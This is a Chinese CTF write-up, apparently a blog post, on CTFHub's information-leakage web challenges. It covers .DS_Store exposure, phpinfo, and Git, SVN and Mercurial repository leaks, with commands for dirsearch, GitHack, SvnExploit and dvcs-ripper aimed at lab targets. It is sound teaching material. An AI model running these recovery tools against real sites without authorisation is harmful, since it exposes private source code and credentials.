    <p><code>.DS_Store</code> 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过<code>.DS_Store</code>可以知道这个目录里面所有文件的清单。</p>

  </div>

<p>打开靶场，看到备份文件下载，直接加<code>.DS_Store</code>访问，得到一个下载文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240917173751838.png"
                      alt="image-20240917173751838"
                ></p>
<blockquote>
<p>文件需要在linux系统打开，或者在windows系统用UTF-8&#x2F;UTF-16格式打开</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240917174419780.png"
                      alt="image-20240917174419780"
                ></p>
<p>发现一串文件名，在靶场中访问看看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240917174533485.png"
                      alt="image-20240917174533485"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240917174538337.png"
                      alt="image-20240917174538337"
                ></p>
<p>成功得到flag！</p></div></div></div>

<h2 id="信息泄露-PHPINFO"><a href="#信息泄露-PHPINFO" class="headerlink" title="信息泄露-PHPINFO"></a>信息泄露-PHPINFO</h2><p>打开靶场，看到这样的页面，点进去就是phpinfo的信息，也许我们要的flag就藏在里面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240914223800500.png"
                      alt="image-20240914223800500"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240914223835290.png"
                      alt="image-20240914223835290"
                ></p>
<p>在页面上用<code>ctrl+F</code>搜索功能，搜索flag，即可找到我们要的flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240914223931169.png"
                      alt="image-20240914223931169"
                ></p>
<h2 id="信息泄露-Git泄露"><a href="#信息泄露-Git泄露" class="headerlink" title="信息泄露-Git泄露"></a>信息泄露-Git泄露</h2><div class="tabs" id="tab-信息泄露-git泄露"><ul class="nav-tabs"><li class="tab active"><a class="#信息泄露-git泄露-1">题目-Log</a></li><li class="tab"><a class="#信息泄露-git泄露-2">题目-Stash</a></li><li class="tab"><a class="#信息泄露-git泄露-3">题目-Index</a></li></ul><div class="tab-content"><div class="tab-pane active" id="信息泄露-git泄露-1"><h3 id="题目-Log"><a href="#题目-Log" class="headerlink" title="题目-Log"></a>题目-Log</h3>  <div class="note p-4 mb-4 rounded-small info">
    <p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题。</p>

  </div>

<p>根据题目提示，提前准备工具需要用到<a class="link"   href="https://github.com/BugScanTeam/GitHack" >GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>打开靶场，页面上很空白，根据题目进行.git文件泄露的恢复操作</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240912213108044.png"
                      alt="image-20240912213108044"
                ></p>
<p>尝试在网址后面添加&#x2F;.git&#x2F;，查看是否网页403或者其他特殊情况，方便我们直接用工具恢复，显然这道题没那么简单</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240912213235037.png"
                      alt="image-20240912213235037"
                ></p>
<p>接下来用网站目录扫描工具，这里用的<a class="link"   href="https://github.com/maurosoria/dirsearch" >dirsearch <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>（可以用御剑等等）</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u 目标地址</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240912213718118.png"
                      alt="image-20240912213718118"
                ></p>
<p>不用扫描完，扫描到确实有.git的存在，我们就可以试试用工具恢复</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240912213911928.png"
                      alt="image-20240912213911928"
                ></p>
<p>在工具包目录下面生成了一些文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240912213948091.png"
                      alt="image-20240912213948091"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240912214334276.png"
                      alt="image-20240912214334276"
                ></p>
<p>但是并没有什么有价值的文件，也没有.git文件</p>
<blockquote>
<p>这是一个坑，要用另一个GitHack.py，并且在python2的环境才可以，建议在kali下运行</p>
<p><a class="link"   href="https://github.com/lijiejie/GitHack" >https://github.com/lijiejie/GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 用于python3，但恢复效果一般</p>
<p><a class="link"   href="https://github.com/BugScanTeam/GitHack" >https://github.com/BugScanTeam/GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 用于python2，效果不错</p>
</blockquote>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py 目标地址/.git</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240912215937518.png"
                      alt="image-20240912215937518"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240912220043425.png"
                      alt="image-20240912220043425"
                ></p>
<p>既然有.git，根据题目来看，可以通过查看日志获得一些信息，kali环境自带git，其他没有git环境的需要自己下载</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">log</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240912220103402.png"
                      alt="image-20240912220103402"
                ></p>
<p>通过观察上面的日志信息，可以发生在第二次修改时<code>add flag</code>，说明我们所要的flag就在第二次修改时加入文件中，使用<code>git reset</code>版本回退命令来查看flag</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git reset --hard 对应版本的commit</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240912220806774.png"
                      alt="image-20240912220806774"
                ></p>
<p>最终我们通过.git文件泄露，回退版本得到了flag</p></div><div class="tab-pane" id="信息泄露-git泄露-2"><h3 id="题目-Stash"><a href="#题目-Stash" class="headerlink" title="题目-Stash"></a>题目-Stash</h3>  <div class="note p-4 mb-4 rounded-small info">
    <p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用<code>BugScanTeam的GitHack</code>完成本题</p>

  </div>

<p>与log文件的恢复相同，仅有一点变化</p>
<p>打开靶场，用工具<a class="link"   href="https://github.com/BugScanTeam/GitHack" >GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>进行.git文件恢复</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py http://你的靶场地址/.git</span><br></pre></td></tr></table></figure></div>

<p>进入dist内生成的文件，输入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git stash list</span><br><span class="line">git stash pop</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240917180019024.png"
                      alt="image-20240917180019024"
                ></p>
<p>成功恢复一个<code>.txt</code>文件，打开就可以得到<code>flag</code>了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240917180115597.png"
                      alt="image-20240917180115597"
                ></p></div><div class="tab-pane" id="信息泄露-git泄露-3"><h3 id="题目-Index"><a href="#题目-Index" class="headerlink" title="题目-Index"></a>题目-Index</h3>  <div class="note p-4 mb-4 rounded-small info">
    <p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用<code>BugScanTeam的GitHack</code>完成本题</p>

  </div>

<p>与前面也是一样的</p>
<p>打开靶场，用工具<a class="link"   href="https://github.com/BugScanTeam/GitHack" >GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>进行.git文件恢复</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py http://你的靶场地址/.git</span><br></pre></td></tr></table></figure></div>

<p>恢复后进入文件夹直接</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git show</span><br></pre></td></tr></table></figure></div>

<p>flag就出来了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240917180700233.png"
                      alt="image-20240917180700233"
                ></p></div></div></div>

<h2 id="信息泄露-SVN泄露"><a href="#信息泄露-SVN泄露" class="headerlink" title="信息泄露-SVN泄露"></a>信息泄露-SVN泄露</h2><p>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p>

  <div class="note p-4 mb-4 rounded-small info">
    <p>这个题目虽然与git泄露类似，但因为是svn，所以恢复起来没那么常见，这个也是看了CSDN上面的WP参考做的，初学者遇到完全没思路或者已经行不通的时候就多去网上找找资料，慢慢培养能力</p>

  </div>

<p>根据题目需要提前准备工具<a class="link"   href="https://github.com/admintony/svnExploit.git" >SVNExploit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>打开靶场看到和题目提示一样，是一个SVN泄露</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240913005004198.png"
                      alt="image-20240913005004198"
                ></p>
<p>使用工具检测目标是否存在SVN泄露（例行检查）</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python SvnExploit.py -u 目标地址/.svn</span><br></pre></td></tr></table></figure></div>

<p>初次使用会有报错，下载pip包就可以</p>
<blockquote>
<p>或者直接在kali里面使用工具，kali里面的py包很全面</p>
</blockquote>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip install prettytable -i https://mirrors.tuna.tsinghua.edu.cn/pypi/web/simple</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240913005735686.png"
                      alt="image-20240913005735686"
                ></p>
<p>再次运行之后可以看到有结果输出，证明有svn泄露</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240913005921606.png"
                      alt="image-20240913005921606"
                ></p>
<p>在原来的命令后面加上<code>--dump</code>参数，把源码下载下来</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python SvnExploit.py -u 目标地址/.svn --dump</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240913010130190.png"
                      alt="image-20240913010130190"
                ></p>
<p>恢复的文件有一个<code>wc.db</code>，是一个数据库文件，可以查看到文件索引</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240913012737667.png"
                      alt="image-20240913012737667"
                ></p>
<p>使用curl命令访问可以文件检查网页源代码是否存在flag，检查均返回404</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://challenge-2465e7edfc335d47.sandbox.ctfhub.com:10800/index.html13523.txt</span><br><span class="line">curl http://challenge-2465e7edfc335d47.sandbox.ctfhub.com:10800/flag_135183523.txt</span><br></pre></td></tr></table></figure></div>

<p>根据上面所示，并没有flag文件，也确实没有直接被下载下来，毕竟题上也写了是在旧版本里面，所以使用其他工具进行还原</p>
<p><a class="link"   href="https://github.com/kost/dvcs-ripper" >dvsc-ripper <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>这个工具需要很多环境和包，所以建议在kali里面执行</p>
<p>进入kali，安装工具所需依赖库</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</span><br></pre></td></tr></table></figure></div>

<p>安装完后，进入到工具目录，执行</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./rip-svn.pl -v -u 目标地址/.svn </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240913011925973.png"
                      alt="image-20240913011925973"
                ></p>
<p>既然是svn文件，那就会在.svn目录下面，低版本SVN具体路径为text-base目录，高版本SVN为pristine目录，然后层层往下查找，中途肯定会有找不到的时候，可以将文件放到实体机，用文件内容搜索工具搜索flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240913012313165.png"
                      alt="image-20240913012313165"
                ></p>
<p>最后flag被找出来，又解决了一道题</p>
<h2 id="信息泄露-HG泄露"><a href="#信息泄露-HG泄露" class="headerlink" title="信息泄露-HG泄露"></a>信息泄露-HG泄露</h2>
  <div class="note p-4 mb-4 rounded-small info">
    <p>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p>

  </div>

<p>打开靶场，这道题比较陌生，所以需要参考其他资料来完成<a class="link"   href="https://blog.csdn.net/hxhxhxhxx/article/details/112759999?ops_request_misc=%7B%22request_id%22:%22169586988116800226538806%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=169586988116800226538806&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-112759999-null-null.142%5Ev94%5Einsert_down28v1&utm_term=ctfhub%E6%8A%80%E8%83%BD%E6%A0%91&spm=1018.2226.3001.4187" >CTFHUB技能树（全详细解析含进阶）-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240917181428325.png"
                      alt="image-20240917181428325"
                ></p>
<p>根据资料也是和.SVN一样的恢复方式</p>
<p>使用工具，<a class="link"   href="https://github.com/kost/dvcs-ripper" >dvsc-ripper <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>这个工具需要很多环境和包，所以建议在kali里面执行</p>
<p>进入kali，安装工具所需依赖库</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</span><br></pre></td></tr></table></figure></div>

<p>安装完后，进入到工具目录，执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./rip-hg.pl -v -u 地址/.hg/</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240917182029336.png"
                      alt="image-20240917182029336"
                ></p>
<p>进入.hg文件，深度查找flag文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240917182149228.png"
                      alt="image-20240917182149228"
                ></p>
<p>回到靶场添加目录文件即可得到flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240917182221366.png"
                      alt="image-20240917182221366"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/image-20240917182227738.png"
                      alt="image-20240917182227738"
                ></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>做题时要根据题目来做题，半做半猜，不要盲目乱入手</p>
<p>在实际做题时会遇到各种坑，需要多花耐心慢慢琢磨（由于本人也是新手，花了好些时间搞这节。。。）</p>
<p><a class="link"   href="https://www.ctfhub.com/#/skilltree" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>路径为web-&gt;信息泄露</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>web-writeup</category>
        <category>ctfhub</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>信息泄露</tag>
      </tags>
  </entry>
</search>
